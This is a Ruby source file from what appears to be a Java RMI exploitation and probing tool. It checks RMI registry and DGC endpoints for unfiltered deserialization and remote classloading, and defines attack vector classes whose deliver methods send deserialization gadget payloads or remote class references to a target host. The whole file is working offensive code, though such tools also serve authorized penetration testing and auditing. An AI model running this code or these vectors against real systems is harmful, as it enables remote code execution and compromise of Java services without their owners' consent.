#!/usr/bin/env ruby
require_relative 'classfile'
require_relative 'serialize'
require_relative 'jrmp'
require_relative 'prober'
require_relative 'util'
require_relative 'payloads/probe'
require_relative 'payloads/dos'
require_relative 'payloads/jrmp'

module Java
  module RMI
    class RMICallArgumentVector < Java::Prober::AttackVector
      def initialize(host, port, objId, uid: nil, methodId: -1, methodHash: 0, ssl: false, baseargs: [nil], argidx: 0)
        @host = host
        @port = port
        @ssl = ssl
        @objId = objId
        @uid = uid
        @methodId = methodId
        @methodHash = methodHash
        @baseargs = baseargs
        @argidx = argidx
        @location = nil
      end

      def inspect
        format('RMI call %s:%d objID %d mId %d mHash %d', @host, @port, @objId, @methodId, @methodHash)
      end
    end

    class RMICallDeserVector < RMICallArgumentVector
      def	initialize(host, port, objId, uid: nil, methodId: -1, methodHash: 0, ssl: false, baseargs: [nil], argidx: 0, ctx: nil)
        super(host, port, objId, uid: uid, methodId: methodId, methodHash: methodHash, ssl: ssl, baseargs: baseargs, argidx: argidx)
        @ctx = ctx
      end

      def id
        ['deser', @host, @port, @ctx.gadgets]
      end

      def prio
        10
      end

      def payload
        nil
      end

      def context
        @ctx
      end

      def deliver(payl)
        args = @baseargs.dup
        args[@argidx] = payl
        client = Java::JRMP::JRMPClient.new(@host, @port, @ctx.reg, ssl: @ssl)
        client.sendLegacy(@objId, @methodId, @methodHash, args, uid: @uid)
      end

      def inspect
        super + ': Deserialization ' + @ctx.gadgets.to_a.to_s
      end
    end

    class RMIClassLoadingVector < RMICallArgumentVector
      def inspect
        super + ': Remote Classloading'
      end

      def id
        ['classload', @host, @port]
      end

      def prio
        -10
      end

      def deliver(payl)
        reg = Java::Serialize::Registry.new(base: File.dirname(__FILE__) + '/')
        reg.load('model/base-java9.json')
        reg.load('model/rmi.json')
        args = @baseargs.dup
        ts = 'L' + payl[1].tr('.', '/') + ';'
        args[@argidx] = Java::Serialize::JavaCustomObject.new(payl[1], {}, 'typeString' => ts)
        client = Java::JRMP::JRMPClient.new(@host, @port, reg, ssl: @ssl, location: payl[0])
        client.sendLegacy(@objId, @methodId, @methodHash, args, uid: @uid)
      end
    end

    class RMIProber
      def initialize(host, port, reg, ssl: false, rc: Java::Runner::RunConfig.new)
        @host = host
        @port = port
        @reg = reg
        @ssl = ssl
        @foundobjects = {}
        @rc = rc
      end

      def check_object_exists(objId, uid: nil)
        begin
          client = Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
          r = client.sendLegacy(objId, 0, 0, [], uid: uid)
          error 'Should not succeed'
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.rmi.server.SkeletonMismatchException'
            return true
          elsif type == 'java.rmi.NoSuchObjectException'
          else
              if !root[1]['detailMessage'].nil?
                error type + ':' + root[1]['detailMessage']
              else
                error type
              end
          end
        end
        false
      end
      
      def test_call(payl, reg, params)

        args = params['args']
        args[params['argidx']] = payl
        send(params['objid'], params['methodid'], params['methodhash'], args, customreg: reg)
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.IllegalArgumentException'
            return
          else
            return type
          end
        end

      def send(objId, opNum, hash, args, uid: nil, location: nil, customreg: nil)
        reg = @reg
        unless customreg.nil?
          customreg.load('model/rmi.json')
          reg = customreg
        end
        client = Java::JRMP::JRMPClient.new(@host, @port, reg, location: location, ssl: @ssl)
        client.sendLegacy(objId, opNum, hash, args, uid: uid)
      end

      def objects
        @foundobjects
      end

      def run
        begin
          check_object_exists(2)
        rescue Java::JRMP::InvalidResponseError => e
          begin
            @ssl = true
            check_object_exists(2)
            info 'Endpoint appears to use SSL'
          rescue
            raise e
          end
        end

        vectors = []
        vectors += run_registry if check_object_exists(0)

        info 'Found Activator, no checks implemented yet' if check_object_exists(1)

        if check_object_exists(2)
          vectors += run_dgc
        else
          error 'No DGC Found'
        end

        if check_object_exists(4)
          info 'Found ActivationSystem, no checks implemented yet'
        end

        vectors
      end
      
      def run_registry
        vectors = []
        regobjects = send(0, 1, 4_905_912_898_345_647_071, [])
        if regobjects.empty?
          info 'Found RMI Registry with no objects registered'
        else
          info 'Found RMI Registry with ' + regobjects.length.to_s + ' registered objects'
        end

        if regobjects.include?('jmxrmi')
          info 'Found JMX server, perform further checks later'
        end

        begin
          send(0, 2, 4_905_912_898_345_647_071, ['doesnotexist'])
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.rmi.NotBoundException'
          else
              error 'Regular lookup failed: ', type, root[1]['detailMessage']
          end
        end

        begin
          url = Java::Serialize::JavaObject.new('Ljava/net/URL;', 'protocol' => 'http',
                                                                  'host' => 'test.invalid',
                                                                  'hashCode' => -1)
          send(0, 2, 4_905_912_898_345_647_071, [url])
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.io.InvalidClassException'
            okay 'Registry lookup() name argument is filtered'
          elsif type == 'java.lang.ClassCastException'
            vuln 'Registry lookup() unfiltered'

            if @rc.tryDeser?
              ctx = Java::Prober::BuiltinProbes.new.create_context(@reg, params: {
                                                                     'objid' => 0,
                                                                     'methodid' => 2,
                                                                     'methodhash' => 4_905_912_898_345_647_071,
                                                                     'args' => [nil],
                                                                     'argidx' => 0
                                                                   })
              strategy = Java::Prober::ExceptionProbeStrategy.new(method(:test_call))
              strategy.init(ctx)

              if ctx.run(strategy)
                vectors.push(RMICallDeserVector.new(@host, @port, 0,
                                                    methodId: 2, methodHash: 4_905_912_898_345_647_071, ssl: @ssl,
                                                    argidx: 0, ctx: ctx))
              end
            end
          else
            error 'Registry lookup() failed: ' + type
          end
        end

        bound = false
        begin
          send(0, 3, 4_905_912_898_345_647_071, ['bindtest', nil])
          bound = true
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.NullPointerException'
          elsif type == 'java.rmi.AccessException' || type == 'java.rmi.AlreadyBoundException'
          else
              error 'Registry rebind() failed: ' + type
          end
        end

        filtered = false
        noaccess = false
        begin
          url = Java::Serialize::JavaObject.new('Ljava/net/URL;', 'protocol' => 'http',
                                                                  'host' => 'test.invalid',
                                                                  'hashCode' => -1)
          send(0, 3, 4_905_912_898_345_647_071, ['bindtest', url])
          bound = true
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.io.InvalidClassException'
            okay 'Registry rebind() is filtered'
            filtered = true
          elsif type == 'java.rmi.AccessException'
            info 'Bind access check before deserialization'
            noaccess = true
          elsif type == 'java.rmi.AlreadyBoundException' || type == 'java.lang.ClassCastException'
            info 'Bind failed: ' + type
          else
            error 'Registry rebind() failed: ' + type
          end
        rescue Exception => e
          error 'Registry rebind() failed: ' + e.to_s
        end

        begin
          if !filtered && @rc.tryClassload? &&
             Java::JRMP.test_remoteclassloading(@host, @port, @reg, 0, 0, 3, 4_905_912_898_345_647_071, ssl: @ssl)
            vectors.push(RMIClassLoadingVector.new(@host, @port, 0,
                                                   methodId: 3,
                                                   methodHash: 4_905_912_898_345_647_071,
                                                   ssl: @ssl))
          end
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
        end

        if @rc.tryDeser? && !noaccess && !filtered
          ctx = Java::Prober::BuiltinProbes.new.create_context(@reg, params: {
                                                                 'objid' => 0,
                                                                 'methodid' => 3,
                                                                 'methodhash' => 4_905_912_898_345_647_071,
                                                                 'args' => ['bindtest', nil],
                                                                 'argidx' => 1
                                                               })
          strategy = Java::Prober::ExceptionProbeStrategy.new(method(:test_call))
          strategy.init(ctx)

          if ctx.run(strategy)
            vectors.push(RMICallDeserVector.new(@host, @port, 0,
                                                methodId: 3, methodHash: 4_905_912_898_345_647_071, ssl: @ssl,
                                                baseargs: ['bindtest', nil], argidx: 1, ctx: ctx))
          end
        end

        begin
          send(0, 4, 4_905_912_898_345_647_071, ['bindtest']) if bound
        rescue => e
          error 'Registry unbind() for cleanup failed: ' + e.to_s
        end

        regobjects.each do |name|
          begin
            ref = send(0, 2, 4_905_912_898_345_647_071, [name])
            ref = Java::JRMP.unwrap_ref(ref)
            if ref.nil?
              error 'Invalid reference ' + name
            else
              @foundobjects[name] = ref
            end
          rescue Java::JRMP::JRMPError => e
            root = Java::JRMP.unwrap_exception(e.ex)
            error 'Failed to lookup ' + name + ': ' + root.to_s
          end
        end

        vectors
      end

      def run_dgc
        vectors = []
        info 'DGC found'
        # r = client.sendLegacy(2,0,17777547820122932803,[]) #DGC.clean(ObjID[], long, VMID, boolean)
        # r = client.sendLegacy(2,1,17777547820122932803,[]) #DGC.dirty(ObjID[], long, Lease)
        begin
          url = Java::Serialize::JavaObject.new('Ljava/net/URL;', 'protocol' => 'http',
                                                                  'host' => 'test.invalid',
                                                                  'hashCode' => -1)
          send(2, 1, 17_777_547_820_122_932_803, [Java::Serialize::JavaArray.new('Ljava/rmi/server/ObjID;', []), Java::Serialize::Data::JavaLong.new(0), url])
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.io.InvalidClassException'
            okay 'DGC filters parameter types'
          elsif type == 'java.lang.ClassCastException'
            vuln 'DGC does not filter parameters'
            vectors += run_dgc_deser if @rc.tryDeser?
          else
            error 'DGC dirty failed: ' + type
          end
        end
        vectors
      end

      def run_dgc_deser
        vectors = []
        ctx = Java::Prober::BuiltinProbes.new.create_context(@reg, params: {
                                                               'objid' => 2,
                                                               'methodid' => 1,
                                                               'methodhash' => 17_777_547_820_122_932_803,
                                                               'args' => [Java::Serialize::JavaArray.new('Ljava/rmi/server/ObjID;', []),
                                                                          Java::Serialize::Data::JavaLong.new(0), nil],
                                                               'argidx' => 2
                                                             })
        strategy = Java::Prober::ExceptionProbeStrategy.new(method(:test_call))
        strategy.init(ctx)

        if ctx.run(strategy)
          vectors.push(RMICallDeserVector.new(@host, @port, 2,
                                              methodId: 1, methodHash: 17_777_547_820_122_932_803, ssl: @ssl,
                                              baseargs: [
                                                Java::Serialize::JavaArray.new('Ljava/rmi/server/ObjID;', []),
                                                Java::Serialize::Data::JavaLong.new(0), nil
                                              ],
                                              argidx: 2, ctx: ctx))
        end
        vectors
      end
    end
  end
end
